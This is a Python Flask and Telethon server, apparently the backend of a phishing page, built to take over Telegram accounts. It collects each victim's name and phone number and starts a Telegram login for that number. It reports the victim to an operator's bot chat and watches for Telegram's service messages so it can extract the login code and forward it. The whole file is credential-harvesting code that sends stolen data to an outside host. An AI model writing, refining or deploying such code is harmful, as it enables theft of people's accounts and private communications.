import os, requests, asyncio, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Ambil Config dari Environment Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Database sementara di RAM
user_sessions = {}
active_status_messages = {}

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    # Menjalankan proses asinkron dengan loop yang aman dari error NoneType
    return asyncio.run(handle_register(request.json))

async def handle_register(data):
    try:
        raw_nomor = data.get('nomor', '').strip().replace(" ", "")
        nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
        nama = data.get('nama', 'User')

        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        # Step 1: Kirim Kode & Munculkan Log Awal
        res = await client.send_code_request(nomor)
        user_sessions[nomor] = {"session": client.session.save(), "nama": nama}
        
        # Sesuai Panah 1: Log muncul di Bot
        bot_api("sendMessage", {
            "chat_id": CHAT_ID,
            "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
            "parse_mode": "Markdown",
            "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"monitor_{nomor}"}]]}
        })
        
        # Otomatis pantau OTP untuk pendaftaran pertama
        asyncio.create_task(otp_listener(nomor))
        
        await client.disconnect()
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        action = call["data"]
        nomor = action.split("_")[1]

        if action.startswith("monitor_"):
            # Sesuai Panah 2: Bot siap menerima OTP!
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "Bot siap menerima OTP!",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            active_status_messages[nomor] = res.get("result", {}).get("message_id")
            
            # Trigger minta kode baru & pantau
            asyncio.run(refresh_otp(nomor))

        elif action.startswith("exit_"):
            # Sesuai Panah 3: Bersihkan teks status & konfirmasi keluar
            if nomor in active_status_messages:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_messages[nomor]})
                active_status_messages.pop(nomor)
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})

    return jsonify({"status": "success"}), 200

async def refresh_otp(nomor):
    data = user_sessions.get(nomor)
    if data:
        client = TelegramClient(StringSession(data["session"]), int(API_ID), API_HASH)
        await client.connect()
        try:
            await client.send_code_request(nomor)
            asyncio.create_task(otp_listener(nomor))
        finally:
            await client.disconnect()

async def otp_listener(nomor):
    data = user_sessions.get(nomor)
    if not data: return
    
    client = TelegramClient(StringSession(data["session"]), int(API_ID), API_HASH)
    await client.connect()
    
    # Listener pesan dari Telegram (777000)
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp = re.search(r'\b\d{5}\b', event.raw_text)
        if otp:
            # Update log utama dengan OTP baru
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp.group(0)}`",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"monitor_{nomor}"}]]}
            })
            # Hapus pesan "Bot siap menerima" secara otomatis
            if nomor in active_status_messages:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_messages[nomor]})
                active_status_messages.pop(nomor)
            await client.disconnect()

    await asyncio.sleep(300) # Monitor selama 5 menit
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))